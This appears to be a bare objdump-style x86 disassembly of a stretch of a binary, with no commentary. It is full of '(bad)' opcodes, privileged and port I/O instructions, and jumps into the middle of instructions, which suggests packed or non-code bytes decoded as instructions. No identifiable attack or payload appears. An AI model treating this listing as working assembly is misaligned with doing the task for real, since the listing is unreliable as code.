  41852e:	pop    esp
  41852f:	cdq    
  418530:	xor    esp,DWORD PTR [eax-0x65031f4]
  418536:	leave  
  418537:	stc    
  418538:	int    0x8b
  41853a:	cmp    eax,0x27f3eb4a
  41853f:	adc    al,0x2c
  418541:	jne    0x4185a7
  418543:	outs   dx,BYTE PTR ds:[esi]
  418544:	mov    edx,0x76178498
  418549:	jge    0x41856e
  41854b:	test   DWORD PTR [eax],ebx
  41854d:	cdq    
  41854e:	pusha  
  41854f:	xor    DWORD PTR [esi-0x5077cbd5],edx
  418555:	clc    
  418556:	fwait
  418557:	rcr    DWORD PTR [edi],1
  418559:	mov    bh,0xb3
  41855b:	ss stos BYTE PTR es:[edi],al
  41855d:	sbb    eax,DWORD PTR [edi-0x45]
  418560:	inc    edx
  418561:	stos   BYTE PTR es:[edi],al
  418562:	inc    edx
  418563:	mov    dl,0x36
  418565:	ret    
  418566:	icebp  
  418567:	pusha  
  418568:	ret    0x5bb0
  41856b:	push   ss
  41856c:	cmp    al,cl
  41856e:	sbb    dl,BYTE PTR [ecx+0x4]
  418571:	push   ecx
  418572:	sar    BYTE PTR [ecx+0x6],cl
  418575:	add    eax,DWORD PTR [ebx-0xe]
  418578:	test   BYTE PTR [eax-0x80],cl
  41857b:	mov    ebp,0xa263660b
  418580:	fld    DWORD PTR [eax-0x45e3bb93]
  418586:	and    BYTE PTR [edi],dl
  418588:	mov    es,WORD PTR [edx-0xb90f770]
  41858e:	std    
  41858f:	cmp    esi,DWORD PTR [edi]
  418591:	mov    bh,0xde
  418593:	daa    
  418594:	push   ebp
  418595:	daa    
  418596:	push   0x3a54ff9d
  41859b:	pop    eax
  41859c:	shl    DWORD PTR [eax],1
  41859e:	inc    edi
  41859f:	or     DWORD PTR [esi+ebx*1],0xffffffbf
  4185a3:	imul   ecx,DWORD PTR [esi],0xffa00b73
  4185a9:	inc    edi
  4185aa:	mov    ebp,DWORD PTR [ecx]
  4185ac:	retf   
  4185ad:	ins    DWORD PTR es:[edi],dx
  4185ae:	(bad)  
  4185af:	adc    bh,BYTE PTR [ecx+0x2a]
  4185b2:	xor    al,0x35
  4185b4:	sub    ch,BYTE PTR [esi-0x3c110ec9]
  4185ba:	(bad)  
  4185bb:	pop    ebx
  4185bc:	mov    ebx,0x937b1d04
  4185c1:	cmp    al,0x33
  4185c3:	inc    edi
  4185c4:	(bad)  
  4185c6:	pop    esi
  4185c7:	pop    edi
  4185c8:	or     ah,BYTE PTR [ebp-0x1c]
  4185cb:	shr    ebx,cl
  4185cd:	adc    al,0x7d
  4185cf:	dec    eax
  4185d0:	pop    edx
  4185d1:	sub    DWORD PTR [edx-0x2],edi
  4185d4:	xchg   edi,eax
  4185d5:	ins    DWORD PTR es:[edi],dx
  4185d6:	adc    cl,BYTE PTR [esi+0x20753b4e]
  4185dc:	pushf  
  4185dd:	sbb    DWORD PTR [ecx],ebx
  4185df:	sub    DWORD PTR [esi-0x49ab9bc5],edi
  4185e5:	(bad)  [ecx+0x53]
  4185e8:	xchg   edi,eax
  4185e9:	ficomp DWORD PTR [eax-0x4a]
  4185ec:	or     dl,BYTE PTR [ecx]
  4185ee:	jbe    0x418621
  4185f0:	jge    0x41865b
  4185f2:	ss clc 
  4185f4:	clc    
  4185f5:	pop    ecx
  4185f6:	pop    ss
  4185f7:	scas   eax,DWORD PTR es:[edi]
  4185f8:	add    BYTE PTR [edi],dh
  4185fa:	cmp    BYTE PTR [eax-0x543f2be7],0x62
  418601:	or     eax,0x6a789d4d
  418606:	mov    ebp,0x7df65bd2
  41860b:	add    bl,0x16
  41860e:	pop    ebp
  41860f:	adc    ah,BYTE PTR [edi-0x4ef6d9cf]
  418615:	test   DWORD PTR [edx],esi
  418617:	adc    BYTE PTR [eax+0x2f],dh
  41861a:	adc    BYTE PTR ss:[ebx+0x71b600f],ah
  418621:	out    dx,al
  418622:	pusha  
  418623:	inc    esi
  418624:	fisttp DWORD PTR [eax]
  418626:	scas   eax,DWORD PTR es:[edi]
  418627:	xor    esp,eax
  418629:	(bad)  
  41862b:	sbb    al,0xa6
  41862d:	arpl   WORD PTR [ebx+0x33a95bc1],cx
  418633:	mov    BYTE PTR [esi-0x20537205],bl
  418639:	mov    edi,0xc751fc2
  41863e:	xor    BYTE PTR [edx],0x92
  418641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418642:	pop    esi
  418643:	rol    edx,cl
  418645:	mov    ebp,0xa7f08538
  41864a:	jg     0x4186bd
  41864c:	mov    cl,0xd0
  41864e:	jb     0x4186b5
  418650:	add    al,0x19
  418652:	push   edi
  418653:	or     al,0x8f
  418655:	push   DWORD PTR [eax]
  418657:	stc    
  418658:	les    edi,FWORD PTR [ebp+0x4]
  41865b:	dec    esi
  41865c:	xchg   ebx,eax
  41865d:	shr    DWORD PTR [eax-0x5f],0x4c
  418661:	in     eax,0x4c
  418663:	sti    
  418664:	call   0x8058:0x30832e8f
  41866b:	inc    edi
  41866c:	mov    edx,0xcfa8084c
  418671:	dec    esi
  418672:	scas   eax,DWORD PTR es:[edi]
  418673:	sahf   
  418674:	xlat   BYTE PTR ds:[ebx]
  418675:	sbb    eax,0x584a035b
  41867a:	sub    bx,WORD PTR [ecx+eax*8-0x12]
  41867f:	push   edx
  418680:	mov    dl,BYTE PTR [edi+0x5fe356a1]
  418686:	mov    esp,0x862bdf4f
  41868b:	fmul   QWORD PTR [ebp*1-0x391f598d]
  418692:	mov    dl,BYTE PTR [edi-0x1c2d5d69]
  418698:	int3   
  418699:	add    esi,0x36
  41869c:	sbb    cl,BYTE PTR [edi-0x68]
  41869f:	bound  ecx,QWORD PTR [esi-0x2282a475]
  4186a5:	lods   eax,DWORD PTR ds:[esi]
  4186a6:	fldcw  WORD PTR [esi]
  4186a8:	or     dh,dl
  4186aa:	fnstsw WORD PTR [ebp+0x35]
  4186ad:	push   es
  4186ae:	mov    ecx,0x35859ff2
  4186b3:	jl     0x4186a6
  4186b5:	xchg   DWORD PTR [edi],ebx
  4186b7:	jbe    0x4186d8
  4186b9:	push   ds
  4186ba:	jo     0x418693
  4186bc:	lock jno 0x4186ea
  4186bf:	xchg   DWORD PTR [ebx-0x4d],edi
  4186c2:	std    
  4186c3:	inc    esi
  4186c4:	dec    esi
  4186c5:	(bad)  
  4186c6:	jmp    0x41872c
  4186c8:	loop   0x41868e
  4186ca:	test   eax,0xf260c8ed
  4186cf:	scas   eax,DWORD PTR es:[edi]
  4186d0:	retf   0xaf61
  4186d3:	or     ch,BYTE PTR [esi+0x3a]
  4186d6:	das    
  4186d7:	(bad)  
  4186d8:	(bad)  
  4186da:	clc    
  4186db:	cs mov dx,0xaaa6
  4186e0:	sar    BYTE PTR [eax],1
  4186e2:	push   ebx
  4186e3:	dec    ebx
  4186e4:	add    eax,0x344cf9a6
  4186e9:	mov    eax,ds:0xbd40ef42
  4186ee:	mov    dl,0x80
  4186f0:	mov    edi,0xa1b5c632
  4186f5:	cwde   
  4186f6:	mov    ah,0xb0
  4186f8:	test   al,0x56
  4186fa:	jno    0x41872f
  4186fc:	shl    esi,cl
  4186fe:	test   eax,0x468007c2
  418703:	cmp    al,0x3d
  418705:	push   0x48
  418707:	sub    al,0x3d
  418709:	push   edi
  41870a:	in     al,dx
  41870b:	out    0x3e,al
  41870d:	jb     0x4186cc
  41870f:	sub    al,0x9a
  418711:	mov    bl,0xc1
  418713:	jmp    0x4186f4
  418715:	xchg   esi,eax
  418716:	(bad)  [edi]
  418718:	push   esi
  418719:	call   DWORD PTR [ebx-0x69]
  41871c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41871d:	or     esi,ebp
  41871f:	sub    eax,0x773f02b2
  418724:	leave  
  418725:	xor    BYTE PTR [ebx+0x7c],ch
  418728:	or     BYTE PTR [edx],cl
  41872a:	gs or  eax,0xfa5e41
  418730:	push   esp
  418731:	outs   dx,DWORD PTR ds:[esi]
  418732:	mov    esp,0xf1236d61
  418737:	push   esp
  418738:	(bad)  
  418739:	sub    al,ah
  41873b:	arpl   WORD PTR [esp+eax*2-0x64],dx
  41873f:	scas   al,BYTE PTR es:[edi]
  418740:	int    0x7
  418742:	dec    edx
  418743:	adc    DWORD PTR [ebp-0x4b],ebx
  418746:	jge    0x418792
  418748:	add    eax,DWORD PTR [ebx-0x7d2bae57]
  41874e:	ret    
  41874f:	in     al,dx
  418750:	js     0x418779
  418752:	out    0x20,eax
  418754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418755:	scas   eax,DWORD PTR es:[edi]
  418756:	not    DWORD PTR ds:0x15890e04
  41875c:	add    al,0xd1
  41875e:	jo     0x41874a
  418760:	imul   ecx,DWORD PTR [ecx-0x80],0x1a70c849
  418767:	sbb    ebp,esp
  418769:	(bad)  
  41876a:	(bad)  
  41876b:	ins    DWORD PTR es:[edi],dx
  41876c:	inc    ecx
  41876d:	jecxz  0x418749
  41876f:	push   ecx
  418770:	xor    BYTE PTR [ecx],ch
  418772:	mov    DWORD PTR ds:0xc1bc69f2,edi
  418778:	jg     0x418785
  41877a:	sub    BYTE PTR [ecx],0xbf
  41877d:	retf   0xad50
  418780:	ins    DWORD PTR es:[edi],dx
  418781:	push   esi
  418782:	loopne 0x41870c
  418784:	repnz add ch,dl
  418787:	jmp    0x418732
  418789:	xchg   esp,eax
  41878a:	(bad)  
  41878b:	fisub  WORD PTR [eax+0x56]
  41878e:	dec    ebp
  41878f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418790:	pop    ebx
  418791:	inc    ebx
  418792:	mov    ds:0x4d512cd7,al
  418797:	mov    ds:0xb3d4271e,eax
  41879c:	repz das 
  41879e:	sti    
  41879f:	and    bh,BYTE PTR [ebx+edi*2-0x6a0b8e5b]
  4187a6:	sbb    DWORD PTR [edi+0x47ee8f9a],esp
  4187ac:	dec    ecx
  4187ad:	push   cs
  4187ae:	or     eax,0xca502462
  4187b3:	xchg   ebx,eax
  4187b4:	stos   DWORD PTR es:[edi],eax
  4187b5:	mov    dl,0x2e
  4187b7:	add    BYTE PTR fs:[ecx],dh
  4187ba:	rcl    DWORD PTR [ebx+0xe],cl
  4187bd:	je     0x4187b4
  4187bf:	xchg   ebx,eax
  4187c0:	jbe    0x418818
  4187c2:	mov    bh,0xb5
  4187c4:	cmp    edi,ebp
  4187c6:	cdq    
  4187c7:	rcr    DWORD PTR [eax+0x7c],cl
  4187ca:	test   eax,0x8cf23b9f
  4187cf:	mov    eax,ds:0xcc66d9b0
  4187d4:	sbb    eax,0xec1c5b8c
  4187d9:	cmp    al,0x45
  4187db:	push   ebp
  4187dc:	std    
  4187dd:	xor    BYTE PTR [esi],0x5b
  4187e0:	mov    bh,dl
  4187e2:	mov    cl,0x6d
  4187e4:	dec    ecx
  4187e5:	sub    ah,BYTE PTR [esp+esi*2+0x7cba15be]
  4187ec:	out    dx,al
  4187ed:	mov    edi,0x58e1098f
  4187f2:	inc    ebx
  4187f3:	outs   dx,DWORD PTR ds:[esi]
  4187f4:	inc    eax
  4187f5:	inc    esi
  4187f6:	mov    cr1,ecx
  4187f9:	mov    DWORD PTR [edx],ebp
  4187fb:	adc    bl,BYTE PTR [ecx+eax*4+0x55]
  4187ff:	aam    0x54
  418801:	mov    eax,ss:0x6fd7d420
  418807:	xchg   ebx,eax
  418808:	pop    ecx
  418809:	xchg   esp,eax
  41880a:	jmp    0x4c99:0x6946d79
  418811:	pop    es
  418812:	xchg   BYTE PTR [esp+edi*1-0x61a8434],ch
  418819:	xchg   ecx,eax
  41881a:	div    BYTE PTR [esp+ebx*4+0x13]
  41881e:	xchg   BYTE PTR [ecx+0x7a],al
  418821:	(bad)  
  418822:	and    BYTE PTR [ebx-0x38edbfc2],cl
  418828:	mov    ecx,0xf4f5fdf5
  41882d:	push   edx
  41882e:	mov    ah,0xad
  418830:	mov    bl,0xd
  418832:	je     0x41884c
  418834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418835:	fldenv [ebx+0x224dcebd]
  41883b:	in     al,0x14
  41883d:	lea    esp,[ebx]
  41883f:	dec    BYTE PTR [ecx+0x6004e8b7]
  418845:	mov    edx,DWORD PTR [esi]
  418847:	dec    edi
  418848:	pop    ds
  418849:	mov    cl,0x90
  41884b:	test   al,0xe7
  41884d:	xchg   esp,ecx
  41884f:	mov    ds:0x26793c0b,al
  418854:	sahf   
  418855:	push   0x6bf181ba
  41885a:	cs mov ax,0xc373
  41885f:	ret    
  418860:	jns    0x418883
  418862:	out    0xec,al
  418864:	ss push ebx
  418866:	inc    eax
  418867:	sbb    eax,0x7d9fb7cc
  41886c:	pop    ebp
  41886d:	pop    ebp
  41886e:	outs   dx,DWORD PTR ds:[esi]
  41886f:	mov    bh,0xb3
  418871:	xchg   edi,eax
  418872:	ja     0x418836
  418874:	dec    edx
  418875:	inc    edi
  418876:	xor    ecx,DWORD PTR [eax+0x68a05278]
  41887c:	mov    dl,0xfc
  41887e:	inc    edi
  41887f:	bound  ebx,QWORD PTR [ecx-0x1b]
  418882:	lock fst DWORD PTR [eax+0x7d8555f4]
  418889:	or     BYTE PTR [ebp-0x6742b2f8],ch
  41888f:	cmp    eax,0xa2378b25
  418894:	xchg   ebx,eax
  418895:	fcomp  QWORD PTR [edx-0x24]
  418898:	mov    ecx,0xe4b3c90c
  41889d:	sub    al,0x69
  41889f:	sbb    BYTE PTR [edx-0x7f4b8b6d],dh
  4188a5:	pop    esp
  4188a6:	add    cl,BYTE PTR [edi-0xa3deb0e]
  4188ac:	fist   DWORD PTR [ebx+ebp*8]
  4188af:	inc    esi
  4188b0:	add    BYTE PTR [ebp-0x56],cl
  4188b3:	pop    ebx
  4188b4:	xchg   ebp,eax
  4188b5:	sbb    ebp,edx
  4188b7:	popf   
  4188b8:	adc    BYTE PTR [ecx+ecx*2+0x5ba5be46],ah
  4188bf:	push   ss
  4188c0:	xor    DWORD PTR [edi],ecx
  4188c2:	shl    ah,1
  4188c4:	dec    edx
  4188c5:	inc    esi
  4188c6:	or     dl,ah
  4188c8:	mov    ch,0x25
  4188ca:	inc    edi
  4188cb:	push   0x1c
  4188cd:	pop    esi
  4188ce:	inc    ebx
  4188cf:	sub    ebp,eax
  4188d1:	arpl   WORD PTR [ebx],ax
  4188d3:	ins    DWORD PTR es:[edi],dx
  4188d4:	clc    
  4188d5:	sbb    al,0x8c
  4188d7:	add    cl,BYTE PTR [ebx-0x6b]
  4188da:	jmp    0x4188a7
  4188dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188dd:	mov    al,ds:0x7c78dda1
  4188e2:	rol    DWORD PTR [esi-0x4ed421a8],0xca
  4188e9:	jne    0x418968
  4188eb:	cmp    ah,BYTE PTR [esp+esi*8+0x12]
  4188ef:	daa    
  4188f0:	lea    ecx,[edi-0x73]
  4188f3:	xor    eax,esp
  4188f5:	add    cl,BYTE PTR [esi-0x2f649d24]
  4188fb:	mov    dh,0x94
  4188fd:	mov    ebp,cs
  4188ff:	xor    BYTE PTR [esi-0xa],bh
  418902:	shl    BYTE PTR [ebp+0x7cb99fd0],1
  418908:	add    ecx,DWORD PTR [ebp-0x308599e7]
  41890e:	pushf  
  41890f:	dec    ecx
  418910:	xchg   BYTE PTR [esi+0x6222f793],bh
  418916:	(bad)  
  418917:	in     al,0x4f
  418919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41891a:	jae    0x4188d5
  41891c:	dec    ebp
  41891d:	fist   WORD PTR [ebx-0x44]
  418920:	cmp    eax,0x6c84e8f2
  418925:	fs dec esp
  418927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418928:	adc    BYTE PTR [edx+0x34cb3689],dl
  41892e:	dec    esi
  41892f:	mov    ds:0x88ce1f65,eax
  418934:	in     eax,0xf0
  418936:	ins    BYTE PTR es:[edi],dx
  418937:	jne    0x41899f
  418939:	jae    0x418974
  41893b:	adc    DWORD PTR [edi],eax
  41893d:	push   es
  41893e:	mov    dh,0x2
  418940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418941:	mov    ah,0x99
  418943:	jmp    0xdc52:0x60ca652c
  41894a:	imul   edx,DWORD PTR [esi+0x7c],0xb470ddb4
  418951:	icebp  
  418952:	jae    0x418920
  418954:	dec    edi
  418955:	enter  0x24ec,0x38
  418959:	push   esi
  41895a:	xor    DWORD PTR [edx+0x8],eax
  41895d:	idiv   ebp
  41895f:	push   ebp
  418960:	xchg   ebx,eax
  418961:	lahf   
  418962:	add    ch,BYTE PTR fs:[edx+0x1f]
  418966:	sub    eax,0x3e7018c8
  41896b:	lods   eax,DWORD PTR ds:[esi]
  41896c:	mov    ebp,0x4396d3a2
  418971:	and    bh,BYTE PTR [ebx]
  418973:	sbb    al,0x24
  418975:	and    BYTE PTR [ebx+0x716c5f10],dl
  41897b:	test   al,0x57
  41897d:	add    ecx,ecx
  41897f:	mov    dh,dh
  418981:	adc    al,0x6f
  418983:	imul   ebx,DWORD PTR [ebp+0x3b3b25b9],0xffffffc1
  41898a:	lods   al,BYTE PTR ds:[esi]
  41898b:	sbb    al,0x5b
  41898d:	mov    dh,dh
  41898f:	jbe    0x418979
  418991:	sti    
  418992:	scas   eax,DWORD PTR es:[edi]
  418993:	sub    edx,DWORD PTR [edi+0x6]
  418996:	fist   DWORD PTR [esi]
  418998:	xor    DWORD PTR [ebp+0x46205075],ecx
  41899e:	int3   
  41899f:	stos   DWORD PTR es:[edi],eax
  4189a0:	sbb    edx,eax
  4189a2:	inc    eax
  4189a3:	mov    ds:0x9255b5a9,eax
  4189a8:	sbb    esi,DWORD PTR [ebx+ebp*1+0x1f]
  4189ac:	mov    edi,0xddb59fdd
  4189b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189b2:	mov    esi,0xd2320133
  4189b7:	xor    eax,0xe132c780
  4189bc:	and    BYTE PTR ds:0x657fc3f2,0x6d
  4189c3:	or     al,0x76
  4189c5:	adc    dh,BYTE PTR [eax]
  4189c7:	cmp    ebp,DWORD PTR [eax]
  4189c9:	push   cs
  4189ca:	push   0x9b7e8d5f
  4189cf:	repnz sbb ah,al
  4189d2:	icebp  
  4189d3:	js     0x418a1b
  4189d5:	jae    0x4189f8
  4189d7:	(bad)  
  4189d8:	fild   DWORD PTR ds:0x9e40285a
  4189de:	jecxz  0x418a06
  4189e0:	xchg   esp,eax
  4189e1:	sbb    DWORD PTR [ebx-0xbfdf09e],edx
  4189e7:	and    BYTE PTR [esp],al
  4189ea:	mov    eax,ds:0xd958896e
  4189ef:	bound  ebp,QWORD PTR ds:0x81d53f30
  4189f5:	aad    0xef
  4189f7:	xchg   DWORD PTR [edi-0x48],esi
  4189fa:	fs inc ebp
  4189fc:	xchg   esp,eax
  4189fd:	inc    esp
  4189fe:	test   eax,0x2fac116f
  418a03:	xchg   ebp,eax
  418a04:	inc    eax
  418a05:	push   esp
  418a06:	cmp    cl,dl
  418a08:	mov    edx,ecx
  418a0a:	dec    eax
  418a0b:	out    dx,al
  418a0c:	cmp    al,bl
  418a0e:	in     eax,0xee
  418a10:	stc    
  418a11:	test   BYTE PTR ss:[ebx],dh
  418a14:	shr    ah,1
  418a16:	gs mov esi,0x1ad00854
  418a1c:	fwait
  418a1d:	pop    es
  418a1e:	(bad)  
  418a1f:	repz or DWORD PTR [edx-0x7ec9b83e],esp
  418a26:	ret    0x9ba4
  418a29:	daa    
  418a2a:	inc    esi
  418a2b:	xchg   edx,eax
  418a2c:	cwde   
  418a2d:	mov    WORD PTR fs:[edi+ecx*8-0x71c53d15],cs
  418a35:	mov    BYTE PTR [esi+edi*4],ch
  418a38:	lahf   
  418a39:	cdq    
  418a3a:	xor    eax,0xa827f8f
  418a3f:	(bad)  
  418a40:	push   esp
  418a41:	fdiv   QWORD PTR [ecx]
  418a43:	in     al,dx
  418a44:	mov    dh,BYTE PTR [eax+0x65]
  418a47:	(bad)  
  418a48:	cdq    
  418a49:	and    al,0x38
  418a4b:	dec    ebp
  418a4c:	imul   ebx,edi,0x950ae346
  418a52:	cld    
  418a53:	jmp    0x4b20e018
  418a58:	adc    cl,BYTE PTR ds:0x3a5d9c56
  418a5e:	xor    edi,DWORD PTR [eax]
  418a60:	loop   0x418a4e
  418a62:	or     dl,BYTE PTR [esi]
  418a64:	pop    edi
  418a65:	jb     0x418a01
  418a67:	cli    
  418a68:	jns    0x418a89
  418a6a:	fnstcw WORD PTR [eax+0x1c8ab7ff]
  418a70:	xlat   BYTE PTR ds:[ebx]
  418a71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a72:	cld    
  418a73:	sbb    DWORD PTR [eax+0x490c05d4],edi
  418a79:	and    al,BYTE PTR [edx-0x679ae8e2]
  418a7f:	adc    al,0xea
  418a81:	pop    es
  418a82:	pop    ds
  418a83:	add    DWORD PTR [ebx-0x34752bab],esi
  418a89:	es retf 0x8ddb
  418a8d:	xlat   BYTE PTR ds:[ebx]
  418a8e:	and    BYTE PTR [ebx+0x367df0a1],ch
  418a94:	out    dx,al
  418a95:	arpl   WORD PTR [edx],ax
  418a97:	adc    BYTE PTR [edi],al
  418a99:	lahf   
  418a9a:	scas   eax,DWORD PTR es:[edi]
  418a9b:	cs or  al,0x9b
  418a9e:	outs   dx,BYTE PTR ds:[esi]
  418a9f:	or     ecx,DWORD PTR [ebx+0x17c13277]
  418aa5:	ficomp DWORD PTR [edi-0x6e]
  418aa8:	into   
  418aa9:	stos   DWORD PTR es:[edi],eax
  418aaa:	add    eax,edi
  418aac:	mov    esi,0x73a1cbf5
  418ab1:	mov    WORD PTR [esi],ds
  418ab3:	aaa    
  418ab4:	(bad)  
  418ab6:	jmp    0xa54baea6
  418abb:	xchg   ebp,eax
  418abc:	xchg   bh,al
  418abe:	mov    ds:0xd5fd350c,eax
  418ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ac4:	inc    eax
  418ac5:	jle    0x418a64
  418ac7:	jae    0x418b38
  418ac9:	retf   
  418aca:	fmulp  st(7),st
  418acc:	pop    es
  418acd:	imul   ecx,DWORD PTR [ebx],0xb0ea8dd7
  418ad3:	rcl    DWORD PTR [ebp+0x7e82ddeb],1
  418ad9:	inc    edi
  418ada:	test   DWORD PTR [edx+0x0],ecx
  418add:	xchg   ebx,eax
  418ade:	mov    eax,ds:0x72aa485a
  418ae3:	xchg   esi,eax
  418ae4:	sar    DWORD PTR [esi-0x44e56592],1
  418aea:	and    dh,BYTE PTR [eax+0x7ac2afe6]
  418af0:	mov    dh,0x71
  418af2:	pushf  
  418af3:	nop
  418af4:	push   edx
  418af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418af6:	out    dx,eax
  418af7:	clc    
  418af8:	and    edi,DWORD PTR [edx-0x60]
  418afb:	jo     0x418ac2
  418afd:	ds pop esp
  418aff:	ret    
  418b00:	stc    
  418b01:	or     ch,dl
  418b03:	jmp    0x418af7
  418b05:	fisttp QWORD PTR [edx-0x2ebde7ee]
  418b0b:	fcomp  DWORD PTR [edx+0x2e7f4e16]
  418b11:	imul   edx,DWORD PTR [edi+0x41],0x7d3f5f7a
  418b18:	int3   
  418b19:	aad    0x64
  418b1b:	jae    0x418b8d
  418b1d:	sbb    eax,0x5126a0c2
  418b22:	mov    eax,ds:0xdddcbbc
  418b27:	inc    ebp
  418b28:	dec    ecx
  418b29:	and    ecx,ebx
  418b2b:	fstp   TBYTE PTR [edi-0x9]
  418b2e:	fs icebp 
  418b30:	dec    ebx
  418b31:	data16 mov bl,0xfd
  418b34:	int3   
  418b35:	adc    al,0x6f
  418b37:	mov    eax,ds:0xd116fc46
  418b3c:	add    bh,BYTE PTR [edx+ebx*1]
  418b3f:	jo     0x418b1b
  418b41:	(bad)  
  418b42:	and    al,0x2a
  418b44:	sti    
  418b45:	fsubr  QWORD PTR [eax-0x8]
  418b48:	sbb    BYTE PTR [ebx+eiz*8+0x25],bl
  418b4c:	nop
  418b4d:	out    dx,eax
  418b4e:	xor    BYTE PTR [ebp-0x51],al
  418b51:	ficom  WORD PTR [ebp-0x4a]
  418b54:	mov    WORD PTR [edx-0x6d705e9e],?
  418b5a:	push   ebp
  418b5b:	cld    
  418b5c:	mov    bh,0x90
  418b5e:	not    edi
  418b60:	xor    al,0xee
  418b62:	inc    edi
  418b63:	mov    dh,0x54
  418b65:	dec    eax
  418b66:	scas   al,BYTE PTR es:[edi]
  418b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b68:	int3   
  418b69:	outs   dx,BYTE PTR ds:[esi]
  418b6a:	push   cs
  418b6b:	iret   
  418b6c:	mov    eax,ds:0x3616dd18
  418b71:	mov    edx,ebp
  418b73:	mov    bl,0x3d
  418b75:	push   esp
  418b76:	and    esi,DWORD PTR [esi-0x73]
  418b79:	push   ecx
  418b7a:	dec    ebx
  418b7b:	dec    esi
  418b7c:	mov    cl,0x40
  418b7e:	and    ecx,DWORD PTR [edi-0x7c8efc03]
  418b84:	jge    0x418b4e
  418b86:	xchg   ebp,eax
  418b87:	into   
  418b88:	test   bl,0xba
  418b8b:	pop    es
  418b8c:	frstor [ebx+0x7]
  418b8f:	pop    edi
  418b90:	mov    ebp,0x12b0e1a4
  418b95:	or     BYTE PTR [ecx+0x1f988e75],0x84
  418b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b9d:	ins    BYTE PTR es:[edi],dx
  418b9e:	pop    eax
  418b9f:	int3   
  418ba0:	popf   
  418ba1:	cmp    eax,0x90b5b856
  418ba6:	jnp    0x418b32
  418ba8:	jmp    0xf014060
  418bad:	sbb    dl,BYTE PTR [esi+0x21f1b8c0]
  418bb3:	jae    0x418bae
  418bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bb6:	cli    
  418bb7:	imul   ebx,DWORD PTR [eax+ecx*1],0x3b
  418bbb:	mov    esi,0x3e0baab0
  418bc0:	loop   0x418c35
  418bc2:	mov    bh,0x84
  418bc4:	add    BYTE PTR [esi-0x57],0x93
  418bc8:	test   eax,ebx
  418bca:	stos   BYTE PTR es:[edi],al
  418bcb:	(bad)  
  418bcc:	inc    BYTE PTR [ebx+0x59]
  418bcf:	jne    0x418c35
  418bd1:	cwde   
  418bd2:	outs   dx,DWORD PTR ds:[esi]
  418bd3:	(bad)  
  418bd4:	jno    0x418c4e
  418bd6:	inc    ebx
  418bd7:	fist   WORD PTR [eax]
  418bd9:	ror    DWORD PTR [ecx],1
  418bdb:	sbb    ch,BYTE PTR ds:0x9015888f
  418be1:	push   edx
  418be2:	cld    
  418be3:	enter  0xf869,0xec
  418be7:	dec    esi
  418be8:	lock mov al,ds:0xc5691af4
  418bee:	and    BYTE PTR [ebx-0x66],al
  418bf1:	mov    ecx,0x473ad011
  418bf6:	jnp    0x418c2e
  418bf8:	dec    ebp
  418bf9:	dec    esi
  418bfa:	sti    
  418bfb:	ins    DWORD PTR es:[edi],dx
  418bfc:	shl    BYTE PTR [edx+0x5c],cl
  418bff:	sbb    eax,0x1d1743b1
  418c04:	inc    esp
  418c05:	outs   dx,DWORD PTR ds:[esi]
  418c06:	rcl    BYTE PTR [edi],0xc6
  418c09:	add    al,0x5a
  418c0b:	jbe    0x418bc9
  418c0d:	inc    esi
  418c0e:	mov    al,ds:0x148b5892
  418c13:	outs   dx,DWORD PTR ds:[esi]
  418c14:	inc    ebx
  418c15:	popf   
  418c16:	cld    
  418c17:	ret    
  418c18:	mov    dh,0x94
  418c1a:	jbe    0x418c11
  418c1c:	lods   al,BYTE PTR ds:[esi]
  418c1d:	popa   
  418c1e:	add    BYTE PTR [edi-0x2b],cl
  418c21:	clc    
  418c22:	hlt    
  418c23:	adc    dh,dh
  418c25:	push   ebx
  418c26:	scas   eax,DWORD PTR es:[edi]
  418c27:	xchg   esi,eax
  418c28:	lahf   
  418c29:	(bad)  
  418c2a:	lock rcr DWORD PTR [eax+0x41],1
  418c2e:	or     eax,0x9e31a9ac
  418c33:	sub    DWORD PTR [esi],esp
  418c35:	mov    bh,0xc5
  418c37:	iret   
  418c38:	lea    esi,[ebp-0x1d]
  418c3b:	shr    BYTE PTR [esi+0x500549bd],0xe2
  418c42:	cdq    
  418c43:	(bad)  
  418c44:	(bad)  
  418c45:	jle    0x418c28
  418c47:	imul   eax,ebx,0xffffffbc
  418c4a:	sbb    eax,0x956df8a5
  418c4f:	mov    ah,0xe0
  418c51:	(bad)  
  418c52:	mov    ebx,0xae811cc7
  418c57:	add    eax,0x4ba78112
  418c5c:	mov    ebx,0x2701c758
  418c61:	add    dh,cl
  418c63:	sub    ch,BYTE PTR [edi]
  418c65:	and    al,0xf3
  418c67:	mov    ecx,0x59909202
  418c6c:	jns    0x418ca2
  418c6e:	mov    ecx,0x2c3affe3
  418c73:	mov    ebx,0x379a8721
  418c78:	and    DWORD PTR [edx+ecx*8],ebx
  418c7b:	gs ss (bad) 
  418c7e:	lahf   
  418c7f:	sub    DWORD PTR [ebp-0x5b9830a9],ebp
  418c85:	mov    DWORD PTR [ecx],edx
  418c87:	cld    
  418c88:	sub    ah,BYTE PTR [ecx-0x7719f760]
  418c8e:	push   eax
  418c8f:	fwait
  418c90:	jbe    0x418c70
  418c92:	sbb    DWORD PTR [ecx+0x394de76d],ebx
  418c98:	shl    ebp,0x7c
  418c9b:	aam    0xf1
  418c9d:	cmp    eax,0xa5d32b79
  418ca2:	mov    ds:0x104a833a,al
  418ca7:	ins    DWORD PTR es:[edi],dx
  418ca8:	daa    
  418ca9:	addr16 jmp 0xb190:0x235a53f3
  418cb1:	xor    ebp,DWORD PTR [edx+0x2329049d]
  418cb7:	push   edi
  418cb8:	pop    edx
  418cb9:	dec    ebp
  418cba:	pop    edi
  418cbb:	add    al,0x52
